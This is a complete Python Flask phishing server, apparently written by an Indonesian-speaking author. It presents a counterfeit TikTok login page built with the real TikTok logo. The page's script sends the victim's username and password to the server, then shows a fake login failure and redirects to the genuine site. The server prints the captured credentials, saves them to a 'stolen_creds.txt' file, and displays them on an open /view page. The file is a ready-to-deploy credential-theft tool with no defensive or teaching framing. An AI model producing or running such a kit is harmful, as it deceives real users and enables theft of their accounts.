#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
tiktok_phisher_simple.py
Server Phishing Sederhana (Render Ready).
"""

import os
from flask import Flask, request, jsonify

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log in | TikTok</title>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; background: #fff; }
        .box { text-align: center; border: 1px solid #ddd; padding: 30px; border-radius: 8px; width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #fe2c55; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        img { width: 100px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/site/static/images/logo.svg">
        <h2>Log in to TikTok</h2>
        <form id="f">
            <input type="text" id="u" placeholder="Username/Email" required>
            <input type="password" id="p" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
    <script>
        document.getElementById('f').onsubmit = function(e) {
            e.preventDefault();
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email: document.getElementById('u').value, password: document.getElementById('p').value})
            }).then(() => {
                alert("Login failed!");
                window.location.href = "https://www.tiktok.com/login";
            });
        };
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    print("\n" + "!"*60)
    print("[🚨] DATA PHISHING DITEMUKAN! [🚨]")
    print(f"[📧] Username/Email: {email}")
    print(f"[🔑] Password: {password}")
    print("!"*60 + "\n")
    
    try:
        with open("stolen_creds.txt", "a", encoding="utf-8") as f:
            f.write(f"User: {email} | Pass: {password}\n")
    except Exception as e:
        print(f"[-] Gagal simpan file: {e}")
        
    return jsonify({"status": "ok"}), 200

@app.route('/view')
def view():
    try:
        with open("stolen_creds.txt", "r", encoding="utf-8") as f:
            content = f.read()
        if not content:
            return "<h2>Belum ada data yang tertangkap.</h2>"
        return f"<h2>Data Tertangkap:</h2><pre style='background:#f4f4f4; padding:20px;'>{content}</pre>"
    except FileNotFoundError:
        return "<h2>Belum ada data yang tertangkap.</h2>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
